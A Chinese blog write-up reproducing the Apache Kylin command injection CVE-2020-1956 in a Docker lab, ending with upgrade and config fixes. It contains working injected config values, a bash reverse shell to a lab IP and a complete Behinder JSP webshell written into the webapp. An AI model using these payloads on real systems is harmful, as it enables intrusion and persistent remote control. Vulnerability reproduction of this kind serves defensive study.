# Apache Kylin 远程代码执行漏洞复现（CVE-2020-1956） - micr067 - 博客园

> 原文：[`www.cnblogs.com/micr067/p/13944280.html`](https://www.cnblogs.com/micr067/p/13944280.html)

# Apache Kylin 远程代码执行漏洞复现（CVE-2020-1956）

## 简介

**Apache Kylin** 是美国 **Apache** 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 **Hadoop/Spark** 之上的 **SQL** 查询接口及多维分析（**OLAP**）等功能。

**Apache Kylin** 中的静态 **API** 存在安全漏洞。攻击者可借助特制输入利用该漏洞在系统上执行任意 OS 命令。以下产品及版本受到影响：**Apache Kylin** 2.3.0 版本至 2.3.2 版本，2.4.0 版本至 2.4.1 版本，2.5.0 版本至 2.5.2 版本，2.6.0 版本至 2.6.5 版本，3.0.0-alpha 版本，3.0.0-alpha2 版本，3.0.0-beta 版本，3.0.0 版本，3.0.1 版本。

## 漏洞描述

在 Kylin 中存在一些 restful API，可以将操作系统命令与用户输入的字符串连接起来，由于未对用户输入内容做
合理校验，导致攻击者可以在未经验证的情况下执行任意系统命令。

## 影响范围

Kylin 2.3.0-2.3.2
Kylin 2.4.0-2.4.1
Kylin 2.5.0-2.5.2
Kylin 2.6.0-2.6.5
Kylin 3.0.0-alpha
Kylin 3.0.0-alpha2
Kylin 3.0.0-beta
Kylin 3.0.0-3.0.1

## 环境搭建

**Kylin** 的环境搭建包括 **Hadoop、Hbase、Spark、Kafka** 等一系列的组件，安装较为复杂。但是**Kylin** 官网文档 [`kylin.apache.org/cn/docs/install/kylin_docker.html`](http://kylin.apache.org/cn/docs/install/kylin_docker.html) 提供了 **Docker** 环境的启动指南，分别执行以下两个命令即可一键启动。

```
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun

systemctl start docker 
```

```
docker pull vulfocus/cve-2020-1956 
```

```
docker run -d \
-m 8G \
-p 7070:7070 \
-p 8088:8088 \
-p 50070:50070 \
-p 8032:8032 \
-p 8042:8042 \
-p 16010:16010 \
vulfocus/cve-2020-1956 
```

访问镜像地址 http://192.168.152.133:7070/kylin/login

默认登陆账号密码 admin/KYLIN

![](img/407a9473ca6571e2f6b55a5bccf96724.png)

![](img/becb40d3b8e1ba8dc97b2f042265ba83.png)

## 漏洞分析

漏洞位于/src/main/java/org/apache/kylin/rest/service/CubeService.java 文件，漏洞点在 **CubeService.java** 中的 **migrateCube()** 函数，漏洞原因是使用 **String.format()** 格式化待执行的系统命令且未做过滤，导致命令内容可被注入，涉及的参数包括 **srcCfgUri**、**dstCfgUri**、**projectName**三个。

![](img/9d2463dcc06aa12d2bda0ae42a1030d9.png)

**Migrate Cube**

查看官方文档：[`kylin.apache.org/cn/docs/howto/howto_use_restapi.html#migrate-cube`](http://kylin.apache.org/cn/docs/howto/howto_use_restapi.html#migrate-cube)

![](img/0af716e49a83e970f54e2d84fd76b20b.png)

Migrate Cube 是一个接口（POST /kylin/api/cubes/{cube}/{project}/migrate），接口中显示分别需要 cube 和 project 两个路径入参，回看 kylin /models 页面上的表格里，已经显示了 cube name 和对应的 Project。

![](img/1852b5a4d401a51606617b561a2ff74f.png)

我们选择第一行记录中的**cube**：**kylin_sales_cube** 和对应的 **Project**：**learn_kylin** 作为路径参数，获取登录 Cookie，尝试如下 POC。

![](img/a07666ccbfbf02761857670f32b92014.png)

返回报错信息

![](img/2a9ba55fa3b95b840f2ca717f2f473d6.png)

## 漏洞利用

漏洞利用条件

1、登录系统

2、修改配置

进入 system 选项卡，在界面上的 **Set Config**中，把 srcCfgUri :kylin.tool.auto-migrate-cube.src-config 配置为 /home/admin/apachekylin-
3.0.1-bin-hbase1x/conf/kylin.propertie，将 destCfgUri :kylin.tool.auto-migrate-cube.dest-config 配置为
/tmp/kylin.properties kylin_sales_cube learn_kylin true true true true; touch /tmp/success; echo ；注意其中注入
了 touch /tmp/success 的系统命令。

![](img/6cc5ca3c258f4eaf3acfe687a3fc4bb0.png)

![](img/5aa8f7b6da6f3382db2f150c879dec68.png)

![](img/74a034f807f1674718c3451ba06a02f0.png)

重新 repeater，返回 200

![](img/0a72b7533d9892b91cbb61e43e295727.png)

进入容器内查看，已经成功写入。

![](img/f202e887dc00af2b65f63e9bb80819ae.png)

### 反弹 shell

将 kylin.tool.auto-migrate-cube.dest-config 配置为 /tmp/kylin.properties kylin_sales_cube learn_kylin true
true true true; bash -i >& /dev/tcp/192.168.152.1/1521 0>&1; echo ; 。其中注入的命令从 touch /tmp/success 换成了
反弹 shell 的命令 bash -i >& /dev/tcp/192.168.152.1/1521 0>&1，反弹到 ip 为 192.168.152.1 的主机上。

![](img/436fa7fe71663da1fbac7e4a0d3eba7f.png)

![](img/e455086f5adc8fbfc3eeb14f7cf5989d.png)

开启监听

![](img/e03895bfd4e5c649b29f99236d3667ba.png)

重新 repeater，无返回信息

![](img/fa937112899aafb5605ff4c905f85fb7.png)

但是宿主机 192.168.152.1 已经成功接收到反弹回来的 shell

![](img/e0400335bde7f512355414dc8ea3ce77.png)

### 写入冰蝎 shell

在界面 Set Config 中，把 srcCfgUri :kylin.tool.auto-migrate-cube.src-config 配置为 /home/admin/apachekylin-
3.0.1-bin-hbase1x/conf/kylin.propertie，
将 destCfgUri :kylin.tool.auto-migrate-cube.dest-config 配置为 /tmp/kylin.properties kylin_sales_cube
learn_kylin true true true true; echo '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>'

> /home/admin/apache-kylin-3.0.1-bin-hbase1x/tomcat/webapps/kylin/shell.jsp; echo

![](img/cdec396557b5efcb836931c10bf3d247.png)

![](img/1b8d5f51ea7dd960f03459f99c0f995f.png)

再次 repeater，返回 200

![](img/9a8a3c67eb9561d368b22552c91839b0.png)

查看容器，成功写入 shell.jsp

![](img/fff38831be2bbea032a6f9c3098aa350.png)

## 漏洞修复

1.官方已发布最新版本修复了此漏洞，用户应尽快升级到 2.6.6 或 3.0.2 版本，下载链接：
[`kylin.apache.org/cn/download/`](http://kylin.apache.org/cn/download/)
2.临时措施：由于该漏洞的入口为 migrateCube，可将 kylin.tool.auto-migrate-cube.enabled 设置为 false 以禁用
命令执行。

参考链接
1.[`paper.seebug.org/1237/`](https://paper.seebug.org/1237/)
2.[`kylin.apache.org/docs/security.html`](https://kylin.apache.org/docs/security.html)